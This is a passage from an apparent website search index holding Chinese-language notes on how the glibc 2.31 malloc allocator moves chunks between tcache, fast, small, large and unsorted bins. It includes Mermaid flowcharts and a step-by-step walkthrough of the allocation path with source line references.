chunk \u200b\u5f53\u4e2d\u200b\u88ab\u200b\u5206\u914d\u200b\u51fa\u6765\u200b</li> <li>\u200b\u88ab\u200b free \u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8fdb\u5165\u200b tcache\uff0c\u200b\u6216\u8005\u200b fast bin\uff0c\u200b\u6216\u8005\u200b\u5408\u5e76\u200b\u540e\u200b\u653e\u5230\u200b unsorted bin\uff0c\u200b\u6216\u8005\u200b\u5408\u5e76\u200b\u5230\u200b top chunk</li> <li>\u200b\u5728\u200b malloc \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4ece\u200b tcache \u200b\u6216\u8005\u200b fast bin \u200b\u5206\u914d\u200b\uff0c\u200b\u53c8\u200b\u6216\u8005\u200b\u4ece\u200b unsorted bin \u200b\u4e2d\u200b\u53d6\u51fa\u200b\uff0c\u200b\u653e\u5230\u200b small bin \u200b\u6216\u200b large bin\uff0c\u200b\u4e2d\u9014\u200b\u53ef\u80fd\u200b\u88ab\u200b\u5206\u914d\u200b\u3001\u200b\u62c6\u5206\u200b\u6216\u8005\u200b\u5408\u5e76\u200b</li> </ol> <pre><code>flowchart TD\n    top_chunk[top chunk]\n    user[user allocated]\n    tcache\n    fast_bin[fast bin]\n    small_bin[small bin]\n    large_bin[large bin]\n    unsorted_bin[unsorted bin]\n\n    top_chunk --&gt;|malloc| user\n    tcache --&gt;|malloc| user\n    fast_bin --&gt;|malloc| user\n    fast_bin --&gt;|malloc| tcache\n    fast_bin --&gt;|consolidate| unsorted_bin\n    fast_bin --&gt;|consolidate| top_chunk\n    small_bin --&gt;|malloc| user\n    small_bin --&gt;|malloc| tcache\n    large_bin --&gt;|malloc| user\n    large_bin --&gt;|malloc| unsorted_bin\n    unsorted_bin --&gt;|malloc| user\n    unsorted_bin --&gt;|malloc| tcache\n    unsorted_bin --&gt;|malloc| small_bin\n    unsorted_bin --&gt;|malloc| large_bin\n\n    user --&gt;|free| tcache\n    user --&gt;|free| fast_bin\n    user --&gt;|free| unsorted_bin\n    user --&gt;|free| top_chunk\n    small_bin --&gt;|free| unsorted_bin\n    large_bin --&gt;|free| unsorted_bin</code></pre>"},{"location":"software/glibc_allocator.html#malloc_4","title":"malloc","text":"<p>malloc \u200b\u7684\u200b\u5b8c\u6574\u200b\u6d41\u7a0b\u56fe\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>---\nconfig:\n  theme: base\n  themeVariables:\n    fontSize: \"30px\"\n---\nflowchart TD\n    malloc[malloc \u200b\u5165\u53e3\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3022\"&gt;malloc.c:3022&lt;/a&gt;\uff09]\n    tcache[\u200b\u5c1d\u8bd5\u200b\u4ece\u200b tcache \u200b\u4e2d\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3047\"&gt;malloc.c:3047&lt;/a&gt;\uff09]\n    fastbin[\u200b\u5c1d\u8bd5\u200b\u4ece\u200b fast bin \u200b\u4e2d\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3577\"&gt;malloc.c:3577&lt;/a&gt;\uff09]\n    fastbin_migrate[\u200b\u5982\u679c\u200b fast bin \u200b\u8fd8\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e14\u200b tcache \u200b\u6ca1\u6709\u200b\u6ee1\u200b\uff0c\u200b\u5219\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b fast bin \u200b\u632a\u5230\u200b tcache\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3596\"&gt;malloc.c:3596&lt;/a&gt;\uff09]\n    smallbin[\u200b\u5c1d\u8bd5\u200b\u4ece\u200b small bin \u200b\u4e2d\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3635\"&gt;malloc.c:3635&lt;/a&gt;\uff09]\n    smallbin_migrate[\u200b\u5982\u679c\u200b small bin \u200b\u8fd8\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e14\u200b tcache \u200b\u6ca1\u6709\u200b\u6ee1\u200b\uff0c\u200b\u5219\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b small bin \u200b\u632a\u5230\u200b tcache\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3652\"&gt;malloc.c:3652&lt;/a&gt;\uff09]\n    malloc_ret[malloc \u200b\u7ed3\u675f\u200b]\n    consolidate[consolidate\uff1a\u200b\u904d\u5386\u200b fast bin\uff0c\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u548c\u200b\u76f8\u90bb\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5408\u5e76\u200b\uff0c\u200b\u63d2\u5165\u200b\u5230\u200b unsorted bin\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L4440\"&gt;malloc.c:4440&lt;/a&gt;\uff09]\n    consolidate_2[consolidate\uff1a\u200b\u904d\u5386\u200b fast bin\uff0c\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u548c\u200b\u76f8\u90bb\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5408\u5e76\u200b\uff0c\u200b\u63d2\u5165\u200b\u5230\u200b unsorted bin\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L4440\"&gt;malloc.c:4440&lt;/a&gt;\uff09]\n    check_large[\u200b\u5757\u200b\u5927\u5c0f\u200b\u662f\u5426\u200b\u5bf9\u5e94\u200b large bin\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3695\"&gt;malloc.c:3695&lt;/a&gt;\uff09]\n    loop[\u200b\u5f00\u59cb\u200b\u5faa\u73af\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3725\"&gt;malloc.c:3725&lt;/a&gt;\uff09]\n    unsorted_bin[\u200b\u904d\u5386\u200b unsorted bin\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3728\"&gt;malloc.c:3728&lt;/a&gt;\uff09]\n    remainder[\u200b\u5185\u5b58\u200b\u5c40\u90e8\u6027\u200b\u4f18\u5316\u200b\uff1a\u200b\u6700\u8fd1\u200b\u4e00\u6b21\u200b split \u200b\u51fa\u6765\u200b\u7684\u200b chunk \u200b\u662f\u5426\u200b\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u7a7a\u95f4\u200b\u5206\u914d\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3756\"&gt;malloc.c:3756&lt;/a&gt;\uff09]\n    remainder_success[\u200b\u62c6\u5206\u200b\u8fd9\u4e2a\u200b chunk \u200b\u4ee5\u200b\u5b8c\u6210\u200b\u5206\u914d\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3761\"&gt;malloc.c:3761&lt;/a&gt;\uff09]\n    remove_unsorted_bin[\u200b\u628a\u200b\u5f53\u524d\u200b chunk \u200b\u4ece\u200b unsorted bin \u200b\u4e2d\u200b\u5220\u9664\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3784\"&gt;malloc.c:3784&lt;/a&gt;\uff09]\n    check_same_size[\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5927\u5c0f\u200b\u548c\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u5426\u200b\u76f8\u540c\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3792\"&gt;malloc.c:3792&lt;/a&gt;\uff09]\n    check_tcache_full[tcache bin \u200b\u662f\u5426\u200b\u5df2\u6ee1\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3800\"&gt;malloc.c:3800&lt;/a&gt;\uff09]\n    alloc_now[\u200b\u5206\u914d\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3807\"&gt;malloc.c:3807&lt;/a&gt;\uff09]\n    move_to_tcache[\u200b\u628a\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u632a\u5230\u200b tcache\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3803\"&gt;malloc.c:3803&lt;/a&gt;\uff09]\n    move_to_bin[\u200b\u6839\u636e\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u632a\u5230\u200b small bin \u200b\u6216\u200b large bin\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3821\"&gt;malloc.c:3821&lt;/a&gt;\uff09]\n    check_tcache[\u200b\u68c0\u67e5\u200b tcache \u200b\u662f\u5426\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3891\"&gt;malloc.c:3891&lt;/a&gt;\uff09]\n    alloc_tcache[\u200b\u4ece\u200b tcache \u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b]\n    unsorted_bin_exit[\u200b\u68c0\u67e5\u200b tcache \u200b\u662f\u5426\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3906\"&gt;malloc.c:3906&lt;/a&gt;\uff09]\n    check_large_alloc[\u200b\u5757\u200b\u5927\u5c0f\u200b\u662f\u5426\u200b\u5bf9\u5e94\u200b large bin\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3917\"&gt;malloc.c:3917&lt;/a&gt;\uff09]\n    alloc_large[\u200b\u5c1d\u8bd5\u200b\u4ece\u200b large bin \u200b\u4e2d\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3922\"&gt;malloc.c:3922&lt;/a&gt;\uff09]\n    alloc_larger[\u200b\u904d\u5386\u200b\u66f4\u5927\u200b\u7684\u200b bin\uff0c\u200b\u5c1d\u8bd5\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L3990\"&gt;malloc.c:3990&lt;/a&gt;\uff09]\n    alloc_top[\u200b\u5c1d\u8bd5\u200b\u4ece\u200b top chunk \u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L4087\"&gt;malloc.c:4087&lt;/a&gt;\uff09]\n    alloc_system[\u200b\u4ece\u200b\u7cfb\u7edf\u200b\u8bf7\u6c42\u200b\u66f4\u200b\u591a\u200b\u5185\u5b58\u200b\u6765\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L4139\"&gt;malloc.c:4139&lt;/a&gt;\uff09]\n    check_fast[fast bin \u200b\u662f\u5426\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08&lt;a href=\"https://github.com/bminor/glibc/blob/glibc-2.31/malloc/malloc.c#L4126\"&gt;malloc.c:4126&lt;/a&gt;\uff09]\n\n    malloc --&gt; tcache\n    tcache --&gt;|\u200b\u5206\u914d\u200b\u6210\u529f\u200b| malloc_ret\n    tcache --&gt;|\u200b\u5206\u914d\u200b\u5931\u8d25\u200b| fastbin\n    fastbin --&gt;|\u200b\u5206\u914d\u200b\u5931\u8d25\u200b| smallbin\n    fastbin --&gt;|\u200b\u5206\u914d\u200b\u6210\u529f\u200b| fastbin_migrate \n    fastbin_migrate --&gt; malloc_ret\n    smallbin --&gt;|\u200b\u5206\u914d\u200b\u6210\u529f\u200b| smallbin_migrate\n    smallbin_migrate --&gt; malloc_ret\n    smallbin --&gt;|\u200b\u5206\u914d\u200b\u5931\u8d25\u200b| check_large\n    check_large --&gt;|\u200b\u662f\u200b| consolidate\n    check_large --&gt;|\u200b\u5426\u200b| loop\n    consolidate --&gt; loop\n    loop --&gt; unsorted_bin\n    unsorted_bin --&gt;|unsorted bin \u200b\u975e\u7a7a\u200b\uff0c\u200b\u6216\u8005\u200b\u5faa\u73af\u200b\u6b21\u6570\u200b\u4e0d\u8db3\u200b 10000 \u200b\u6b21\u200b| remainder\n    remainder --&gt;|\u200b\u662f\u200b| remainder_success\n    remainder_success --&gt; malloc_ret\n    remainder --&gt;|\u200b\u5426\u200b| remove_unsorted_bin\n    remove_unsorted_bin --&gt; check_same_size\n    check_same_size --&gt;|\u200b\u662f\u200b| check_tcache_full\n    check_tcache_full --&gt;|\u200b\u5426\u200b| move_to_tcache\n    check_tcache_full --&gt; |\u200b\u662f\u200b| alloc_now\n    alloc_now --&gt; malloc_ret\n    move_to_tcache --&gt; unsorted_bin\n    check_same_size --&gt;|\u200b\u5426\u200b| move_to_bin\n    move_to_bin --&gt; check_tcache\n    check_tcache --&gt;|\u200b\u662f\u200b| alloc_tcache\n    alloc_tcache --&gt; malloc_ret\n    check_tcache --&gt;|\u200b\u5426\u200b| unsorted_bin\n    unsorted_bin --&gt;|unsorted bin \u200b\u5df2\u7a7a\u200b\uff0c\u200b\u6216\u8005\u200b\u5faa\u73af\u200b\u6b21\u6570\u200b\u8d85\u8fc7\u200b 10000 \u200b\u6b21\u200b| unsorted_bin_exit\n    unsorted_bin_exit --&gt;|\u200b\u662f\u200b| alloc_tcache\n    unsorted_bin_exit --&gt;|\u200b\u5426\u200b| check_large_alloc\n    check_large_alloc --&gt;|\u200b\u662f\u200b| alloc_large\n    alloc_large --&gt;|\u200b\u5206\u914d\u200b\u6210\u529f\u200b| malloc_ret\n    alloc_large --&gt;|\u200b\u5206\u914d\u200b\u5931\u8d25\u200b| alloc_larger\n    check_large_alloc --&gt;|\u200b\u5426\u200b| alloc_larger\n    alloc_larger --&gt;|\u200b\u5206\u914d\u200b\u6210\u529f\u200b| malloc_ret\n    alloc_larger --&gt;|\u200b\u5206\u914d\u200b\u5931\u8d25\u200b| alloc_top\n    alloc_top --&gt;|\u200b\u5206\u914d\u200b\u6210\u529f\u200b| malloc_ret\n    alloc_top --&gt;|\u200b\u5206\u914d\u200b\u5931\u8d25\u200b| check_fast\n    check_fast --&gt;|\u200b\u662f\u200b| consolidate_2\n    consolidate_2 --&gt; loop\n    check_fast --&gt;|\u200b\u5426\u200b| alloc_system\n    alloc_system --&gt; malloc_ret</code></pre> <p>\u200b\u524d\u9762\u200b\u5206\u6bb5\u200b\u6574\u7406\u200b\u4e86\u200b malloc \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5728\u200b\u8fd9\u91cc\u200b\u5217\u51fa\u200b\u5b8c\u6574\u200b\u7684\u200b malloc \u200b\u6d41\u7a0b\u200b\uff1a</p> <ol> <li>malloc \u200b\u7684\u200b\u5165\u53e3\u200b\u662f\u200b <code>__libc_malloc (size_t bytes)</code> \u200b\u51fd\u6570\u200b</li> <li>\u200b\u5982\u679c\u200b\u914d\u7f6e\u200b\u4e86\u200b malloc hook\uff0c\u200b\u5219\u200b\u8c03\u7528\u200b malloc hook\uff0c\u200b\u76f4\u63a5\u200b\u8fd4\u56de\u200b\u7ed3\u679c\u200b</li> <li>\u200b\u6839\u636e\u200b\u7528\u6237\u200b\u4f20\u5165\u200b\u7684\u200b malloc \u200b\u7684\u200b\u5b57\u8282\u6570\u200b\uff08<code>bytes</code>\uff09\uff0c\u200b\u7528\u200b <code>checked_request2size</code> \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5b9e\u9645\u200b\u7684\u200b chunk \u200b\u5927\u5c0f\u200b\uff0c\u200b\u7b97\u6cd5\u200b\u662f\u200b\u5148\u200b\u52a0\u4e0a\u200b <code>sizeof(size_t)</code>\uff08\u200b\u7ed9\u200b <code>mchunk_size</code> \u200b\u9884\u7559\u200b\u7a7a\u95f4\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u5411\u4e0a\u200b\u5bf9\u9f50\u200b\u5230\u200b <code>MALLOC_ALIGNMENT</code>\uff08\u200b\u901a\u5e38\u200b\u662f\u200b <code>2 * sizeof(size_t)</code>\uff09\u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u518d\u200b\u548c\u200b <code>MINSIZE</code> \u200b\u53d6\u200b max\uff0c\u200b\u5176\u4e2d\u200b <code>MINSIZE</code> \u200b\u901a\u5e38\u200b\u662f\u200b <code>4 * sizeof(size_t)</code>\uff0c\u200b\u56e0\u4e3a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u81f3\u5c11\u200b\u8981\u200b\u4fdd\u5b58\u200b\u4e24\u4e2a\u200b size \u200b\u52a0\u4e0a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7684\u200b <code>fd</code> \u200b\u548c\u200b <code>bk</code> \u200b\u6307\u9488\u200b</li> <li>\u200b\u5982\u679c\u200b tcache \u200b\u8fd8\u200b\u6ca1\u200b\u521d\u59cb\u5316\u200b\uff0c\u200b\u5c31\u200b\u521d\u59cb\u5316\u200b tcache</li> <li>\u200b\u6839\u636e\u200b chunk \u200b\u5927\u5c0f\u200b\uff0c\u200b\u8ba1\u7b97\u200b tcache index\uff0c\u200b\u68c0\u67e5\u200b\u5bf9\u5e94\u200b\u7684\u200b bin \u200b\u662f\u5426\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff1b\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u76f4\u63a5\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5e76\u200b\u8fd4\u56de\u200b</li> <li>\u200b\u63a5\u7740\u200b\u83b7\u53d6\u200b\u4e00\u4e2a\u200b arena\uff0c\u200b\u5982\u200b\u6709\u200b\u5fc5\u8981\u200b\uff0c\u200b\u83b7\u53d6\u200b arena \u200b\u7684\u200b\u9501\u200b\uff1b\u200b\u5728\u200b\u5355\u7ebf\u7a0b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b main_arena\uff1b\u200b\u591a\u7ebf\u7a0b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u6709\u200b\u4e00\u4e2a\u200b\u9ed8\u8ba4\u200b\u7684\u200b arena \u200b\u6307\u9488\u200b\uff08<code>static __thread mstate thread_arena</code>\uff09\uff0c\u200b\u5728\u200b\u9047\u5230\u200b lock contention \u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u52a8\u6001\u200b\u5207\u6362\u200b</li> <li>\u200b\u8fdb\u5165\u200b <code>_int_malloc</code> \u200b\u4ece\u200b arena \u200b\u4e2d\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b chunk\uff0c\u200b\u5206\u914d\u200b\u5b8c\u6210\u200b\u540e\u200b\u91ca\u653e\u200b arena \u200b\u7684\u200b\u9501\u200b</li> <li>\u200b\u63a5\u7740\u200b\u5206\u6790\u200b <code>_int_malloc</code> \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u9664\u200b tcache \u200b\u4ee5\u5916\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u903b\u8f91\u200b\u90fd\u200b\u5728\u200b <code>_int_malloc</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b</li> <li>\u200b\u5224\u65ad\u200b chunk size \u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u5bf9\u5e94\u200b fast bin \u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5728\u200b\u5bf9\u5e94\u200b\u7684\u200b fast bin \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u4e2d\u200b\u5bfb\u627e\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff1b\u200b\u5982\u679c\u200b\u94fe\u8868\u200b\u975e\u7a7a\u200b\uff0c\u200b\u5219\u200b\u53d6\u51fa\u200b\u94fe\u8868\u200b\u5934\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u63a5\u7740\u200b\u628a\u200b fast bin \u200b\u94fe\u8868\u200b\u4e0a\u200b\u5269\u4f59\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u632a\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u76f4\u5230\u200b fast bin \u200b\u94fe\u8868\u200b\u7a7a\u200b\u6216\u8005\u200b tcache \u200b\u6ee1\u200b\u4e3a\u6b62\u200b\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u5224\u65ad\u200b chunk size \u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u5bf9\u5e94\u200b small bin \u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5728\u200b\u5bf9\u5e94\u200b\u7684\u200b small bin \u200b\u7684\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u4e2d\u200b\u5bfb\u627e\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff1b\u200b\u5982\u679c\u200b\u94fe\u8868\u200b\u975e\u7a7a\u200b\uff0c\u200b\u5219\u200b\u53d6\u51fa\u200b\u94fe\u8868\u200b\u5c3e\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u63a5\u7740\u200b\u628a\u200b small bin \u200b\u94fe\u8868\u200b\u4e0a\u200b\u5269\u4f59\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u632a\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u76f4\u5230\u200b small bin \u200b\u94fe\u8868\u200b\u7a7a\u200b\u6216\u8005\u200b tcache \u200b\u6ee1\u200b\u4e3a\u6b62\u200b\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u5224\u65ad\u200b chunk size \u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u5bf9\u5e94\u200b large bin \u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5219\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b malloc_consolidate\uff1a\u200b\u904d\u5386\u200b fast bin \u200b\u6bcf\u200b\u4e00\u4e2a\u200b bin \u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5c1d\u8bd5\u200b\u628a\u200b\u5b83\u200b\u548c\u200b\u5185\u5b58\u200b\u4e0a\u200b\u76f8\u90bb\u200b\u7684\u200b\u524d\u540e\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5408\u5e76\u200b\uff0c\u200b\u5408\u5e76\u200b\u540e\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5165\u200b unsorted bin\uff1b\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u7a7a\u95f2\u200b\u5757\u200b\u548c\u200b top chunk \u200b\u76f8\u90bb\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u5408\u5e76\u200b\u5230\u200b top chunk\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5165\u200b unsorted bin</li> <li>\u200b\u5f00\u59cb\u200b\u4e00\u4e2a\u200b\u5927\u200b\u7684\u200b\u65e0\u9650\u200b\u5faa\u73af\u200b <code>for (;;)</code>\uff0c\u200b\u5982\u679c\u200b\u540e\u7eed\u200b\u5c1d\u8bd5\u200b\u5404\u79cd\u200b\u65b9\u5f0f\u200b\u90fd\u200b\u5206\u914d\u200b\u4e0d\u200b\u6210\u529f\u200b\uff0c\u200b\u4f46\u662f\u200b fast bin \u200b\u8fd8\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5728\u200b malloc_consolidate \u200b\u540e\u4f1a\u200b\u4ece\u200b\u8fd9\u91cc\u200b\u5f00\u59cb\u200b\u518d\u200b\u5c1d\u8bd5\u200b\u4e00\u6b21\u200b\u5206\u914d\u200b</li> <li>\u200b\u904d\u5386\u200b unsorted bin\uff0c\u200b\u6700\u200b\u591a\u200b\u5904\u7406\u200b 10000 \u200b\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff1a<ol> <li>\u200b\u5982\u679c\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u5bf9\u5e94\u200b small bin\uff0c\u200b\u5e76\u4e14\u200b\u5b83\u200b\u662f\u200b\u6700\u8fd1\u200b\u521a\u200b split \u200b\u51fa\u6765\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u653e\u5f97\u200b\u4e0b\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5c31\u200b\u539f\u5730\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u524d\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u5219\u200b\u653e\u200b\u56de\u5230\u200b unsorted bin\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b unsorted bin \u200b\u94fe\u8868\u200b\u4e2d\u200b\u5220\u9664\u200b</li> <li>\u200b\u5982\u679c\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u6b63\u597d\u200b\u662f\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5224\u65ad\u200b tcache \u200b\u662f\u5426\u200b\u8fd8\u6709\u200b\u7a7a\u95f4\u200b\uff1b\u200b\u5982\u679c\u200b tcache \u200b\u5df2\u7ecf\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4f5c\u4e3a\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b\uff1b\u200b\u5982\u679c\u200b tcache \u200b\u8fd8\u200b\u6ca1\u6ee1\u200b\uff0c\u200b\u5219\u200b\u5148\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u632a\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u7ee7\u7eed\u200b\u5904\u7406\u200b unsorted bin \u200b\u7684\u200b\u5176\u4ed6\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u5c3d\u91cf\u200b\u628a\u200b tcache \u200b\u586b\u6ee1\u200b</li> <li>\u200b\u6839\u636e\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u63d2\u5165\u200b\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b small bin \u200b\u6216\u8005\u200b large bin \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u8bb0\u5f55\u200b\u63d2\u5165\u200b\u5230\u200b small bin \u200b\u6216\u8005\u200b large bin 